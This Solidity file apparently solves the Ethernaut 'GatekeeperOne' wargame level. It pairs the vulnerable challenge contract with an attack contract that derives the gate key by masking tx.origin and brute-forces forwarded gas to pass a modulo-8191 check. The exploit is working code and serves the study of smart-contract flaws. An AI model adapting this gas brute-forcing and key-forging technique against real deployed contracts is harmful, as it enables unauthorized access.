// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract GatekeeperOne {
    using SafeMath for uint256;
    address public entrant;

    // https://stackoverflow.com/questions/43318077/solidity-type-address-not-convertible-to-type-uint256
    uint256 i = uint256(uint160(address(tx.origin)));

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft().mod(8191) == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(i),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}

contract AttackGateKeeperOne {
    GatekeeperOne public gatekeeperOne;
    // tx.origin value in bytes8 will be the last 16 digits of your own address
    // higher order bits are truncated
    bytes8 txOrigin = 0x4Bc6937AAEB9f076;

    // 1. casting uint32 -> uint16
    // need to take out the higher order 4 digits (16 bits - 2 ** 4)
    // which is done by masking with 0x0000FFFF

    // 2. uint32(uint64(_gateKey)) != uint64(_gateKey)
    // means we have to keep the higher order digits in uint64 form
    // e.g. 0x1111111100001111 != 0x00001111
    // which is done by masking with 0xFFFFFFFF0000FFFF

    // 3. uint32(uint64(_gateKey)) == uint16(tx.origin)
    bytes8 key = txOrigin & 0xFFFFFFFF0000FFFF;

    constructor(GatekeeperOne _gatekeeperOne) {
        gatekeeperOne = GatekeeperOne(_gatekeeperOne);
    }

    // NOTE: the proper gas offset to use will vary depending on the compiler
    // version and optimization settings used to deploy the factory contract.
    // To migitage, brute-force a range of possible values of gas to forward.
    // Using call (vs. an abstract interface) prevents reverts from propagating.
    function attack() public {
        // bruteforcing through the amount of gas used for running the enter() function 
        // until the function passes gate two
        for (uint256 i = 0; i < 120; i++) {
            // using low level .call() function here to control the amount of gas used for running th enter() function
            (bool result, bytes memory data) = address(gatekeeperOne).call{
                gas: i + 150 + 8191 * 3
                // gas cost for PUSH opcode == 3
                // 8191 is the mod value for gate two
                // 150 == ?? (not sure why 150)
            }(abi.encodeWithSignature(("enter(bytes8)"), key));
            if (result) {
                break;
            }
        }
    }
}
